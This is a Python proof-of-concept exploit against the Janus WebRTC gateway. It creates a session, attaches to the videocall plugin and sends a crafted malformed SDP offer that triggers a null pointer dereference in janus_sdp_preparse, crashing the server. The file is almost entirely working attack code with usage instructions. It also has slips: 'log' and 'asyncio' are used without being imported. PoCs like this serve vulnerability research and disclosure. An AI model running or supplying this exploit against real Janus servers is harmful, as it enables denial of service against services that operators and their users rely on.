#!/usr/bin/env python3

# Trigger Null Pointer Dereference vulnerability in Janus.
# Vulnerable: janus_sdp_preparse
# python3 ./sdp_null_deref_media_level.py -s http://10.10.10.10 -p 8088

import sys

from utils import JanusPlugin, JanusSession, Exploit

from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack


class ExploitMediaLevelNullDeref(Exploit):
    def __init__(self, server, port):
        self.url = '{}:{}/janus'.format(server, port)

    async def trigger_sdp_parsing(self,
                       name='konata',
                       plugin_name='janus.plugin.videocall'):
        session = JanusSession(self.url, name)
        await session.create()
        self.log_success('session created')

        plugin = await session.attach(plugin_name)
        self.log_success('attached to {} plugin'.format(plugin_name))

        pc = RTCPeerConnection()
        pc.addTrack(VideoStreamTrack())
        await pc.setLocalDescription(await pc.createOffer())

        self.log_info('trying to trigger null pointer dereference at janus_sdp_preparse')

        sdp = '\n'.join([
            'v=-1',
            'o=aaaa 0 0 IN IP6 cccc',
            's=aaaa',
            't=1 2',
            'c=IN IP4 dddd',
            'm=audio 1 ffff 0',
            'a=mid'
        ])
        self.log_info('malicious sdp is crafted')

        try:
            self.log_info('sending a malicious offer...')
            response = await plugin.send({
                "body": {
                },
                "jsep": {
                    "sdp": sdp,
                    "type": 'offer'
                }
            })
        except Exception:
            self.log_success('null dereference is triggered')
            sys.exit(0)
        
        answer = await session.get_answer()
        log.info('got answer: {}'.format(answer))

        await pc.setRemoteDescription(
            RTCSessionDescription(
                sdp=answer["sdp"], type=answer["type"]
            )
        )

        await asyncio.sleep(10)

    def exploit(self):
        super().exploit(tasks=[
            (self.trigger_sdp_parsing, ())
        ])


if __name__ == '__main__':
    server, port = Exploit.parse_args()
    if server is None or port is None:
        log.error('invalid arguments')

    exp = ExploitMediaLevelNullDeref(server, port)
    exp.exploit()